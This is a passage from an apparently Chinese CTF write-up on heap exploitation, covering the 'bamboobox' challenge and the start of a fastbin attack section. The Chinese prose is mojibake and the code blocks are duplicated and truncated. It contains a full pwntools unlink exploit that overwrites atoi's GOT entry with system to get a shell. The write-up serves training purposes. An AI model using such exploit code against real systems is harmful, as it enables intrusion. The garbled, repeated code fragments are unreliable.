class="hljs-built_in">puts</span>(<span class="hljs-string"><code class="language-hljs c"><span class="hljs-comment">//change</span><br><span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v2 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>, &amp;buf);<br>      <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;nptr, <span class="hljs-number">8u</span>LL);<br>      v0 = atoi(&amp;nptr);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>, &amp;nptr);<br>      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>] + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>], v0)) = <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>é—®é¢˜å°±å‡ºåœ¨changeåŠŸèƒ½ä¸Š<br>è¾“å…¥nemeçš„é•¿åº¦çš„æ—¶å€™å¹¶æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å¤§äºä¹‹å‰çš„é•¿åº¦ï¼Œé€ æˆäº†å †æº¢å‡ºæ¼æ´</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-comment">//rmeove_item</span><br><span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v1 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] )<br>    {<br>      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>]);<br>      *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] = <span class="hljs-number">0L</span>L;<br>      itemlist[<span class="hljs-number">4</span> * v1] = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      --num;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string"><code class="language-hljs c"><span class="hljs-comment">//rmeove_item</span><br><span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v1 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] )<br>    {<br>      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>]);<br>      *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] = <span class="hljs-number">0L</span>L;<br>      itemlist[<span class="hljs-number">4</span> * v1] = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      --num;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>removeåŠŸèƒ½åšçš„æŒºå¥½çš„ï¼Œè¯¥ç½®nullä¹Ÿéƒ½ç½®nulläº†</p><p>å‡½æ•°åˆ†æå®Œäº†ï¼Œæ¥ç€å°±æ¥æ„æ€å¦‚ä½•åˆ©ç”¨<br>è¿˜æ˜¯å…ˆå°è£…ä¸€æ³¢å‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(idx, length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(idx, length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"1"</span>)<br></code></pre></td></tr></tbody></table></figure><p>æ—¢ç„¶æœ‰ä¸¥é‡çš„å †æº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ„é€ å †ï¼Œæ»¡è¶³unlinkçš„åˆ©ç”¨æ¡ä»¶<br>å…ˆmallocä¸‰ä¸ªchunk</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#è¦ç”¨æ¥æº¢å‡ºçš„chunk  chunk0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#victim chunk      chunk1</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment"><code class="language-hljs python">add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#è¦ç”¨æ¥æº¢å‡ºçš„chunk  chunk0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#victim chunk      chunk1</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#é˜²æ­¢ä¸Šé¢çš„chunk freeä¹‹åå’Œtop chunkåˆå¹¶  chunk2</span><br></code></pre></td></tr></tbody></table></figure><p>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„å †ç»“æ„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/13.jpg" alt=""><br>æ¥ç€æˆ‘ä»¬å¼€å§‹æ„é€ fakechunk<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯æº¢å‡ºåˆ°chunk1çš„pre_sizeå’Œsizeä½ï¼Œé™¤å»chunk0çš„headerï¼Œæˆ‘ä»¬è‡³å°‘è¦ç¼–è¾‘0x40-0x10+0x10=0x40å¤§å°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs python">fake_chunk=p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pre_size</span><br>fake_chunk+=p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#size</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x18</span>) <span class="hljs-comment">#fd</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x10</span>) <span class="hljs-comment">#bk</span><br>fake_chunk+=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x20</span><br>fake_chunk+=p64(<span class="hljs-number">0x40</span>) <span class="hljs-comment">#fakechunk size</span><br>fake_chunk+=p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#chunk1 size,å¹¶ä¸”æ ‡è®°fakechunkä¸ºç©ºé—²çŠ¶æ€</span><br>change(<span class="hljs-number">0</span>,<span class="hljs-number"><code class="language-hljs python">fake_chunk=p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pre_size</span><br>fake_chunk+=p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#size</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x18</span>) <span class="hljs-comment">#fd</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x10</span>) <span class="hljs-comment">#bk</span><br>fake_chunk+=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x20</span><br>fake_chunk+=p64(<span class="hljs-number">0x40</span>) <span class="hljs-comment">#fakechunk size</span><br>fake_chunk+=p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#chunk1 size,å¹¶ä¸”æ ‡è®°fakechunkä¸ºç©ºé—²çŠ¶æ€</span><br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,fake_chunk)<br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­ptr=0x6020c8,å³chunk0çš„æŒ‡é’ˆçš„åœ°å€<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/14.jpg" alt=""><br>æˆ‘ä»¬çš„fakechunkå·²ç»æ„é€ å¥½äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯unlinkäº†ï¼Œå½“æˆ‘ä»¬freeæ‰chunk1ï¼Œç³»ç»Ÿä¼šæ£€æµ‹åˆ°fakechunkä¹Ÿæ˜¯ç©ºé—²çŠ¶æ€ï¼Œå°±ä¼šå°†å®ƒä¸€å¹¶freeï¼Œæœ€ç»ˆç»“æœå°±æ˜¯åŸæœ¬åº”è¯¥æŒ‡å‘fakechunkçš„æŒ‡é’ˆPæŒ‡å‘äº†&amp;ptr-8çš„ä½ç½®ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/15.jpg" alt=""><br>ç¡®å®å¦‚æˆ‘ä»¬é¢„æ–™ä¸€æ ·ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç¼–è¾‘chunk0çš„è¯ï¼Œå…¶å®æ˜¯åœ¨ç¼–è¾‘0x6020b0çš„å†…å­˜<br>æˆ‘ä»¬å†æ¥æ³„éœ²libcåŸºåœ°å€</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(<span class="hljs-number">0x40</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])<br>change(<span class="hljs-number">0</span>,<span class="hljs-number"><code class="language-hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(<span class="hljs-number">0x40</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,payload)<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬çœ‹çœ‹changeä¹‹å‰çš„0x6020b0å¤„çš„å†…å­˜<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/17.jpg" alt=""><br>changeä¹‹åçš„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/18.jpg" alt=""><br>å¦‚å¦‚ä¸Šæ ‡æ³¨çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ chunk0ï¼Œå¦åˆ™æ— æ³•ç»•è¿‡æ£€æŸ¥<br>ç„¶åæˆ‘ä»¬æ‰“å°å‡ºchunk0çš„å†…å®¹ï¼Œå³atoiçš„çš„åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºlibcåŸºåœ°å€å’Œsystemå‡½æ•°åœ°å€ï¼Œæ¥ç€ï¼Œæˆ‘ä»¬å†æ¬¡ç¼–è¾‘chunk0ï¼Œå°†<code>elf.got['atoi']</code>æ›¿æ¢æˆ<code>system@got</code>ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåªè¦æˆ‘ä»¬å†è¾“å…¥ä¸€ä¸ª<code>sh</code>ï¼Œatoi(sh)å°±å˜æˆäº†system(sh),å³å¯getshell<br>å®Œæ•´expå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">'./bamboobox'</span>)<br><span class="hljs-comment">#io=remote("node3.buuoj.cn",28938)</span><br>elf=ELF(<span class="hljs-string">'bamboobox'</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(idx, length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"1"</span>)<br><br>ptr=<span class="hljs-number">0x6020c8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br>fake_chunk=p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pre_size</span><br>fake_chunk+=p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#size</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x18</span>) <span class="hljs-comment">#fd</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x10</span>) <span class="hljs-comment">#bk</span><br>fake_chunk+=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x20</span><br>fake_chunk+=p64(<span class="hljs-number">0x40</span>)<br>fake_chunk+=p64(<span class="hljs-number">0x90</span>)<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,fake_chunk)<br>remove(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(<span class="hljs-number">0x40</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,payload)<br>gdb.attach(io)<br>show()<br>io.recvuntil(<span class="hljs-string">"0 : "</span>)<br>atoi = u64(io.recvuntil(<span class="hljs-string">":"</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = atoi - <span class="hljs-number">0x36e80</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number">0x45390</span><br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>io.recvuntil(<span class="hljs-string">":"</span>)<br>io.sendline(<span class="hljs-string">"sh"</span>)<br>io.sendline(<span class="hljs-string"><code class="language-hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">'./bamboobox'</span>)<br><span class="hljs-comment">#io=remote("node3.buuoj.cn",28938)</span><br>elf=ELF(<span class="hljs-string">'bamboobox'</span>)<br>context.log_level = <span class="hljs-string">'debug'</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"2"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(idx, length, name)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"3"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(length))<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"4"</span>)<br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(str(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span><br>    io.recvuntil(<span class="hljs-string">":"</span>)<br>    io.sendline(<span class="hljs-string">"1"</span>)<br><br>ptr=<span class="hljs-number">0x6020c8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br>fake_chunk=p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#pre_size</span><br>fake_chunk+=p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#size</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x18</span>) <span class="hljs-comment">#fd</span><br>fake_chunk+=p64(ptr<span class="hljs-number">-0x10</span>) <span class="hljs-comment">#bk</span><br>fake_chunk+=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x20</span><br>fake_chunk+=p64(<span class="hljs-number">0x40</span>)<br>fake_chunk+=p64(<span class="hljs-number">0x90</span>)<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,fake_chunk)<br>remove(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(<span class="hljs-number">0x40</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])<br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,payload)<br>gdb.attach(io)<br>show()<br>io.recvuntil(<span class="hljs-string">"0 : "</span>)<br>atoi = u64(io.recvuntil(<span class="hljs-string">":"</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<br>libc = atoi - <span class="hljs-number">0x36e80</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">"libc:"</span>,hex(libc)<br>system = libc + <span class="hljs-number">0x45390</span><br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>io.recvuntil(<span class="hljs-string">":"</span>)<br>io.sendline(<span class="hljs-string">"sh"</span>)<br>io.sendline(<span class="hljs-string">'5'</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>fastbin attackæ˜¯åˆ©ç”¨fastbinåˆ†é…åŸç†çš„æ¼æ´ï¼Œè¦æ±‚æœ‰å †æº¢å‡ºæ¼æ´ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸double freeã€use after freeå’Œchunk extendè¿ç”¨<br>è¯¦ç»†çš„è®²è§£å¯ä»¥çœ‹çœ‹<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">breezeO_o</a>å¸ˆå‚…çš„æ–‡ç« ï¼Œè®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘è¿™é‡Œå°±è®°å½•ä¸€ä¸‹æˆ‘åšçš„ä¸¤é“é¢˜</p><h3 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h3><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/19.jpg" alt=""><br>64ä½æ–‡ä»¶ï¼Œå¯ä»¥å¤å†™gotè¡¨<br>è¿è¡Œä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/20.jpg" alt=""><br>å¢åˆ æŸ¥æ”¹ï¼Œæ²¡æ¯›ç—…<br>IDAåˆ†æ<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/21.jpg" alt=""><br>mainå‡½æ•°åˆ©ç”¨switché€‰æ‹©åŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/22.jpg" alt=""><br>åˆ†æcreateåŠŸèƒ½<br>æœ€å¤§èƒ½åˆ›å»ºåæ¬¡<br>ç„¶åä¼šå…ˆmallocä¸€ä¸ª0x10(å®é™…ä¸º0x20)å¤§å°çš„chunk(ç§°ä¹‹ä¸ºheap)ï¼Œå…¶æŒ‡é’ˆå­˜å…¥heaparrayæ•°ç»„ä¸­<br>æ¥ä¸‹æ¥åˆ†é…ç”¨æˆ·æŒ‡å®šå¤§å°çš„chunk(content)ï¼Œå…¶sizeå­˜å…¥heapæ•°æ®æ®µçš„ç¬¬ä¸€ä¸ªå…«å­—èŠ‚ä¸­(å³fdä½)ï¼Œcontentçš„æŒ‡é’ˆå­˜å…¥heapçš„ç¬¬äºŒä¸ªå…«å­—èŠ‚å½“ä¸­(å³bkä½)<br>heapç»“æ„å¦‚ä¸‹</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heap</span> {</span><br>    <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span> ;<br>    <span class="hljs-keyword"><code class="language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heap</span> {</span><br>    <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span> ;<br>    <span class="hljs-keyword">char</span> *content 